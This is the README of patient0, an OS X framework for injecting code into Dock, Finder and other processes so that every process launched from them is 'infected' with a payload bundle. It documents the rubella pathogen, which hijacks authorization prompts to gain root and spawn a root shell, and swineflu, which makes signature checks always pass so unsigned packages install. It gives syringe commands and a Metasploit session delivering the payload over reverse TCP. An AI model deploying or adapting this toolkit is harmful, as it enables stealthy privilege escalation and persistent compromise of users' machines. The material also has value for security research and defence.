     _______  _______ __________________ _______  _       _________ _______
    (  ____ )(  ___  )\__   __/\__   __/(  ____ \( (    /|\__   __/(  __   )
    | (    )|| (   ) |   ) (      ) (   | (    \/|  \  ( |   ) (   | (  )  |
    | (____)|| (___) |   | |      | |   | (__    |   \ | |   | |   | | /   |
    |  _____)|  ___  |   | |      | |   |  __)   | (\ \) |   | |   | (/ /) |
    | (      | (   ) |   | |      | |   | (      | | \   |   | |   |   / | |
    | )      | )   ( |   | |   ___) (___| (____/\| )  \  |   | |   |  (__) |
    |/       |/     \|   )_(   \_______/(_______/|/    )_)   )_(   (_______)

    May 2009                              Will Drewry <redpig@dataspill.org>
                                          http://github.com/redpig/patient0
                                          Released under a BSD-style license
                                          `cat ./LICENSE`


## What is [`patient0`]?

[`patient0`] provides a foundation for exploring trust relationships between
the user, running processes, and privileges on OS X using runtime code
injection and function interposition.  In particular, [`patient0`] is a tool
for performing widespread process 'infection' by making key applications, like
Dock and Finder, spread the custom code.  [`patient0`] is built on
[`libpatient0`].

[`libpatient0`] provides a lightweight framework for creating and interacting
with processes on a given OS X x86 system.  Its provided functionality includes
the following:

- function interposition through lazy and stub jump table patching
- process spawning with task port retention
- bundle injection in to running processes
- process listing and simple searching

None of these techniques are new, but until now, have not been collected in to
a centralized location.  In addition, the reference implementation,
[`patient0`] supplies features which make process behavior exploration even
easier:

- 'intercepts' LaunchServices-related calls
- 'infects' all new processes with a given mach-o bundle on launch

This means that an arbitrary bundle can be injected in to all new processes
started from a [`patient0`]-process, like Dock, Finder, or SystemUIServer,
The arbitrary bundle to be injected, or pathogen, will follow a simple form,
but will otherwise be free to perform whatever actions desired.  [`rubella`]
is the primary example included (`pathogens/rubella`).

## How does it work?

[`patient0`] relies on two specific capabilities in OS X:

1. A given process's mach task port can be sent to any other process
2. A process's mach task port doesn't change on exec (except s-bit binaries)

This means that any arbitrary executable (that then doesn't fork()/daemonize())
may be started while its task port is retained.  In our case, we send the task
port back to the parent process. [`libpatient0`] provides this functionality in
`patient0/spawn.h`.  With this functionality, we can quickly restart an
application as an infected one -- especially an application that doesn't
usually have mandatory arguments or specific user-state, like the Dock.

Once we have something like the Dock acting as [`patient0`], any process launch
requests can be intercepted using lazy-function interposition.  The
interposition will result in the requested program being launched with the task
port retained in the [`patient0`] process.  The [`patient0`] process will then
infect the new process be infected with a given pathogen (using
[`patient0/infect.h`]).

One of the many interesting side effects of process infection is that it gives
access to a number of features that other platforms don't always have.  For
instance, an infected Software Update may allow for unsigned package
installation (see `swineflu`).  Or, worse, when an
unprivileged process asks the Authorization for rights, those rights will
become accessible to the attached pathogen code allowing for privileged
execution after the user has authenticated for what they believed to be a
normal, trusted action: preference pane unlocking, screensaver unlocking(*),
etc.

(*) The screensaver is normally launched by the user's launchd process.  However, the ScreenSaverEngine can be spawned independently.

## Usage

[`patient0`] may be used for further development, standalone, or as a
metasploit payload.

### Developers

See the `Components` section.

### Standalone

The initial infection is handled by the `syringe` program.  It will inject
a `patient0` bundle in to the given application 

    make syringe
    ./syringe pathogen.bundle [<pid> </path/to/binary>]

This will run `syringe` and infect the Dock, SystemUIServer, and Finder unless
a process id and path is specified. If one of the given arguments are supplied,
only that process will be infected.

(Adding support for arbitrary pathogen injection is on the short todo list.)

### Metasploit

In order to use `patient0` with Metasploit, run the following build command
and follow the instructions on the screen:

    make metasploit

With the files in place, you can inject `patient0` with `rubella` into a
vulnerable application. The payload is sent and injected over a reverse TCP
connection which is not maintained:

    ./msfconsole
    msf> use exploit/osx/browser/awesome
    msf[awesome]> set payload osx/x86/rubella/reverse_tcp
    msf[awesome]> set SRVPORT=8080
    msf[awesome]> set LHOST=192.168.1.75 # this machine
    msf[awesome]> exploit
    ... wait ...
    msf[awesome]>

Currently, `rubella` doesn't phone home.  However, it can run an arbitrary
Tcl script.  Currently, that script is `web.tcl`.  It binds to port 8081
and listens for a connection.  Any bundle or Tcl script can be injected.
The approach is convoluted, but flexible enough (for now).


## Components

### libpatient0.a

#### include/patient0/spawn.h

The spawn components provides utility functions for starting a process while
retaining its mach task port which may be used by the infection component
below.

#### include/patient0/infect.h

The infect component provides utility functions for injecting a bundle in to a
running process using its mach task.  This uses a modified version of Dino Dai
Zovi's inject_bundle.s from the Metasploit project.

#### include/patient0/process.h

The process component provides utility functions for interacting with
the currently running processes on the system prior to acquiring task handles.

#### include/patient0/runtime.h

The runtime component provides a few helper functions foruse when writing
pathogens.  For instance, you may want to avoid exitting ungracefully when
your bundle runtime exits.  To avoid this, you can deadlock it with
    runtime_deadlock();

#### include/patient0/log.h

The log component contains simple `p0_logf` macros for easy logging without
polluting the namespace too badly.

#### include/patient0/mach_jump.h

The mach_jump component provides utility functions for interacting with
the running process's jump_table section.  It allows for easily reversible and
robust function interposition (hijacking) of any function supplied by an
external library (for the most part).  In addition, it provides some
functions for walking the Mach-O symbol table to perform name-based jump_table
entry resolution.  Additional (dodgier) functionality can be found by looking
around `include/patient0/mach_jump/*.h`.

### patient0.bundle

`patient0`, as a bundle, encapsulates the above functionality in to one library
and adds a runtime on top of it.  The runtime is accessed by calling:

    void run(void *self, size_t size)

The supplementary bundle will attempt to be read from self+size-4 where a 4 byte
unsigned integer is expected to then be preceded by the bundle.  This secondary
bundle is the actual infection and will be spread to other launched processes
(along with `patient0`).

`patient0` is acts as a pathogen superspreader.  It should be injected in to
processes that are responsible for interacting with users to launch processes,
like Dock, Finder, and the SystemUIServer, as per earlier discussion.

`patient0` intercepts LSOpenRefFromSpec to replace calls to ensure infection.
Currently, only opening .app's is supported.

### syringe

`syringe` is the standalone program which will respawn a given process and
inject patient0 and a specified bundle into it.  See `usage` above.

There is also a `syringe` bundle which is compatible with metasploit's
inject_bundle payload.  This will inject patient0 and a bundle (read over
the wire) into the Dock and Finder.

## Pathogens

Pathogens are plugins for `patient0`.  They are the code that is spread
when `patient0` infects a process.

### `rubella`

`rubella` is the primary example of a pathogen built on the `patient0`
framework. It interposes the Authorization functions to determine when
an infected process has attempted to acquire privileged credentials.
If system.privilege.admin was not requested, it will be added to the rights
list (in AuthorizationCopyRights).  Once system.privilege.admin privileges have
been received, `rubella` will spawn a ruby shell with root privileges via
AuthorizationExecuteWithPrivileges and execute the pivot.rb code along with a
custom payload.  It will inject this custom payload into the launchd thereby
escalating the rubella-owner to root.

### `swineflu`

`swineflu` intercepts all call to `CSSM_VerifyData` making them all return
successful.  In addition, it imports all `patient0` functionality and
will infect any processes launched from processes it is in.  It is particularly
effective at making a spawned Software Update instance allow for unsigned
package installation.

(Not done yet)


## Thanks
- [nemo@felinemenace.org][1] for countless articles and tutorials
- [ddz@theta44.org][2] for metasploit osx payloads
  (especially, inject_bundle.s) and the promise of macterpeter
- [michaelw+comments@foldr.org][3] for his sampling_fork example
- Jon [Rentzsch][4] for forging the way with mach_star tools
- Amit Singh for the excellent [`Mac OS X Internals`][5]
- hdm, spoonm, and others for the awesomeness that is [metasploit 3.x][6]

## Future work, TODOs, etc

- add automatic symbol stub patching on dynamic image addition (_register*)
- add automatic symbol stub patching for loaded libraries by crawling load commands
- determine if runner or Installer is calling AuthorizationCopyRights
- write real tests
- fully comment all libpatient0 functions (doxygen would be a bonus)
- add more file types to patient0 and clean up the code
- determine how Software Update is invoked from the menu and intercept it.
- integrate into mac-meterpreter.
- look into passing a custom bootstrap port/namespace to have access to
  exception handler ports.
- port the remainder of the patient0 functionality into pivot.rb.
- add a pathogen which passes the open fd to the dock with a reverse session that allows for task port accruing.
- make rubella disable further injection if it has been successful once.
- Add SoftwareUpdate respawn support to swineflu to infect _any_ launched instance.
- look into authorizationdb tweaks, etc
- make a self-hosted software update spoof server/proxy
- overriding CSSM_VerifyDat and CFURLCreateDataAndPropertiesFromResource to
  automatically provide a fake Software Update server to software update
  processes and disable the package signature checks.
- look into the behavior of runtike injection into processes signed by
  Apple with the SecTask=allowed(,safe) option and then request
  system.privilege.taskport access:
    - E.g., LeakAgent(32|64)
- look into how taskgated port allocations are handled (does it have to be
  root?) and if SecCodeCheckValidity could be overriden if not.


[1]: http://felinemenace.org/~nemo  "Neil 'nemo' Archibald"
[2]: http://theta44.org "Dino Dai Zovi"
[3]: http://www.foldr.org/~michaelw/log/computers/macosx/task-info-fun-with-mach "Michael Weber"
[4]: http://rentzsch.com "Jon Rentzsch"
[5]: http://osxbook.com "Amit Singh's Mac OS X Internals Book"
[6]: http://metasploit.org "Metasploit Framework"


